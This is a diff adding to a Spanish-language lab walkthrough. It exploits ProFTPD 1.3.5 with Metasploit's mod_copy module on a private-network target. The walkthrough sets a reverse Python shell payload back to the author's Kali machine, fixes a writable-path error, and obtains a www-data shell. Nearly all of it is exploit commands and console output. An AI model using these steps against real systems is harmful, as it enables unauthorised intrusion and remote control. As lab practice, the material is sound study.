@@ -306,9 +306,169 @@ The Metasploit Framework is a Rapid7 Open Source Project
 
 </pre>
 
-4. Ya validamos que en la ip 192.168.115.3 el servicio de ProFTP 1.3.5 existe forma de explotarla con metasploit
+4. Ya validamos que en la ip 192.168.115.3 el servicio de ProFTP 1.3.5 existe forma de explotarla con metasploit, ahora trataremos de explotarla
 
-Abrimos la consola de metaxploit
+<pre><u style="text-decoration-style:solid">msf</u> &gt; search ProFTPD
+
+Matching Modules
+================
+
+   #   Name                                                                 Disclosure Date  Rank       Check  Description
+   -   ----                                                                 ---------------  ----       -----  -----------
+   0   exploit/linux/misc/netsupport_manager_agent                          2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
+   1   exploit/linux/ftp/proftp_sreplace                                    2006-11-26       <font color="#5EBDAB">great</font>      Yes    <span style="background-color:#9755B3">ProFTPD</span> 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
+   2     \_ target: Automatic Targeting                                     .                .          .      .
+   3     \_ target: Debug                                                   .                .          .      .
+   4     \_ target: <span style="background-color:#9755B3">ProFTPD</span> 1.3.0 (source install) / Debian 3.1             .                .          .      .
+   5   exploit/freebsd/ftp/proftp_telnet_iac                                2010-11-01       <font color="#5EBDAB">great</font>      Yes    <span style="background-color:#9755B3">ProFTPD</span> 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
+   6     \_ target: Automatic Targeting                                     .                .          .      .
+   7     \_ target: Debug                                                   .                .          .      .
+   8     \_ target: <span style="background-color:#9755B3">ProFTPD</span> 1.3.2a Server (FreeBSD 8.0)                     .                .          .      .
+   9   exploit/linux/ftp/proftp_telnet_iac                                  2010-11-01       <font color="#5EBDAB">great</font>      Yes    <span style="background-color:#9755B3">ProFTPD</span> 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
+   10    \_ target: Automatic Targeting                                     .                .          .      .
+   11    \_ target: Debug                                                   .                .          .      .
+   12    \_ target: <span style="background-color:#9755B3">ProFTPD</span> 1.3.3a Server (Debian) - Squeeze Beta1          .                .          .      .
+   13    \_ target: <span style="background-color:#9755B3">ProFTPD</span> 1_3_3a Server (Debian) - Squeeze Beta1 (Debug)  .                .          .      .
+   14    \_ target: <span style="background-color:#9755B3">ProFTPD</span> 1.3.2c Server (Ubuntu 10.04)                    .                .          .      .
+   15  exploit/unix/ftp/<span style="background-color:#9755B3">proftpd</span>_modcopy_exec                                2015-04-22       <font color="#5EBDAB">excellent</font>  Yes    <span style="background-color:#9755B3">ProFTPD</span> 1.3.5 Mod_Copy Command Execution
+   16  exploit/unix/ftp/<span style="background-color:#9755B3">proftpd</span>_133c_backdoor                               2010-12-02       <font color="#5EBDAB">excellent</font>  No     <span style="background-color:#9755B3">ProFTPD</span>-1.3.3c Backdoor Command Execution
+
+
+Interact with a module by name or index. For example <font color="#5EBDAB">info 16</font>, <font color="#5EBDAB">use 16</font> or <font color="#5EBDAB">use exploit/unix/ftp/proftpd_133c_backdoor</font>
+
+<u style="text-decoration-style:solid">msf</u> &gt; use 15
+</pre>
+
+El xploit que coincide con la versión de nuestro programa es el #15 por eso es el que vamos a usar
+
+<pre><u style="text-decoration-style:solid">msf</u> &gt; use 15
+<font color="#277FFF"><b>[*]</b></font> No payload configured, defaulting to cmd/unix/reverse_netcat
+<u style="text-decoration-style:solid">msf</u> exploit(<font color="#EC0101"><b>unix/ftp/proftpd_modcopy_exec</b></font>) &gt;</pre>
+
+Vamos a cambiar el payload por comodidad
+
+<pre><u style="text-decoration-style:solid">msf</u> exploit(<font color="#EC0101"><b>unix/ftp/proftpd_modcopy_exec</b></font>) &gt; set payload cmd/unix/ (presionamos TAP y nos muestra todas las opciones)
+set payload cmd/unix/adduser             set payload cmd/unix/bind_perl           set payload cmd/unix/pingback_bind       set payload cmd/unix/reverse_netcat      set payload cmd/unix/reverse_python
+set payload cmd/unix/bind_awk            set payload cmd/unix/bind_perl_ipv6      set payload cmd/unix/pingback_reverse    set payload cmd/unix/reverse_perl        set payload cmd/unix/reverse_python_ssl
+set payload cmd/unix/bind_netcat         set payload cmd/unix/generic             set payload cmd/unix/reverse_awk         set payload cmd/unix/reverse_perl_ssl    
+<u style="text-decoration-style:solid">msf</u> exploit(<font color="#EC0101"><b>unix/ftp/proftpd_modcopy_exec</b></font>) &gt; set payload cmd/unix/reverse_python
+payload =&gt; cmd/unix/reverse_python
+</pre>
+
+Validamos sus  opciones y las llenamos
+<pre><u style="text-decoration-style:solid">msf</u> exploit(<font color="#EC0101"><b>unix/ftp/proftpd_modcopy_exec</b></font>) &gt; show options 
+
+Module options (exploit/unix/ftp/proftpd_modcopy_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   CHOST                       no        The local client address
+   CPORT                       no        The local client port
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, socks5h, http, sapni, socks4
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       HTTP port (TCP)
+   RPORT_FTP  21               yes       FTP port
+   SITEPATH   /var/www         yes       Absolute writable website path
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base path to the website
+   TMPPATH    /tmp             yes       Absolute writable path
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_python):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+   SHELL  /bin/sh          yes       The system shell to use
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   ProFTPD 1.3.5
 
 
 
+View the full module info with the <font color="#5EBDAB">info</font>, or <font color="#5EBDAB">info -d</font> command.
+
+<u style="text-decoration-style:solid">msf</u> exploit(<font color="#EC0101"><b>unix/ftp/proftpd_modcopy_exec</b></font>) &gt; set RHOST 192.168.115.3 (IP de mi equipo objetivo)
+RHOST =&gt; 192.168.115.3
+<u style="text-decoration-style:solid">msf</u> exploit(<font color="#EC0101"><b>unix/ftp/proftpd_modcopy_exec</b></font>) &gt; set LHOST 192.168.115.4 (La ip que tengo en mi kali )
+LHOST =&gt; 192.168.115.4
+<u style="text-decoration-style:solid">msf</u> exploit(<font color="#EC0101"><b>unix/ftp/proftpd_modcopy_exec</b></font>) &gt; show options
+</pre>
+
+Validamos que todo este correcto
+
+<pre><u style="text-decoration-style:solid">msf</u> exploit(<font color="#EC0101"><b>unix/ftp/proftpd_modcopy_exec</b></font>) &gt; show options
+
+Module options (exploit/unix/ftp/proftpd_modcopy_exec):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   CHOST                       no        The local client address
+   CPORT                       no        The local client port
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: socks5, socks5h, http, sapni, socks4
+   RHOSTS     192.168.115.3    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       HTTP port (TCP)
+   RPORT_FTP  21               yes       FTP port
+   SITEPATH   /var/www         yes       Absolute writable website path
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base path to the website
+   TMPPATH    /tmp             yes       Absolute writable path
+   VHOST                       no        HTTP server virtual host
+
+Payload options (cmd/unix/reverse_python):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.115.4    yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+   SHELL  /bin/sh          yes       The system shell to use
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   ProFTPD 1.3.5
+
+View the full module info with the <font color="#5EBDAB">info</font>, or <font color="#5EBDAB">info -d</font> command.
+</pre>
+
+Ejecutamos el xploit
+
+<pre><u style="text-decoration-style:solid">sf</u> exploit(<font color="#EC0101"><b>unix/ftp/proftpd_modcopy_exec</b></font>) &gt; run
+<font color="#277FFF"><b>[*]</b></font> Started reverse TCP handler on 192.168.115.4:4444 
+<font color="#277FFF"><b>[*]</b></font> 192.168.115.3:80 - 192.168.115.3:21 - Connected to FTP server
+<font color="#277FFF"><b>[*]</b></font> 192.168.115.3:80 - 192.168.115.3:21 - Sending copy commands to FTP server
+<font color="#EC0101"><b>[-]</b></font> 192.168.115.3:80 - Exploit aborted due to failure: unknown: 192.168.115.3:21 - Failure copying PHP payload to website path, directory not writable?
+<font color="#277FFF"><b>[*]</b></font> Exploit completed, but no session was created.
+<u style="text-decoration-style:solid">msf</u> exploit(<font color="#EC0101"><b>unix/ftp/proftpd_modcopy_exec</b></font>) &gt;</pre>
+
+El error observado como se ve en la antepenultima lina es que el directorio de tiene permisos de escritura vamos a probar con el html
+
+<pre><u style="text-decoration-style:solid">msf</u> exploit(<font color="#EC0101"><b>unix/ftp/proftpd_modcopy_exec</b></font>) &gt; set SITEPATH /var/www/html
+SITEPATH =&gt; /var/www/html
+</pre>
+
+Ejecutamos nuevamente
+
+<pre><u style="text-decoration-style:solid">sf</u> exploit(<font color="#EC0101"><b>unix/ftp/proftpd_modcopy_exec</b></font>) &gt; run
+<font color="#277FFF"><b>[*]</b></font> Started reverse TCP handler on 192.168.115.4:4444 
+<font color="#277FFF"><b>[*]</b></font> 192.168.115.3:80 - 192.168.115.3:21 - Connected to FTP server
+<font color="#277FFF"><b>[*]</b></font> 192.168.115.3:80 - 192.168.115.3:21 - Sending copy commands to FTP server
+<font color="#277FFF"><b>[*]</b></font> 192.168.115.3:80 - Executing PHP payload /tEngqz.php
+i<font color="#47D4B9"><b>[+]</b></font> 192.168.115.3:80 - Deleted /var/www/html/tEngqz.php
+<font color="#277FFF"><b>[*]</b></font> Command shell session 1 opened (192.168.115.4:4444 -&gt; 192.168.115.3:44065) at 2026-03-27 19:03:51 -0400
+
+id
+/bin/sh: 11: iid: not found
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+</pre>
+<pre><u style="text-decoration-style:solid">msf</u> ¡¡FELICIDADES!!
+</pre>
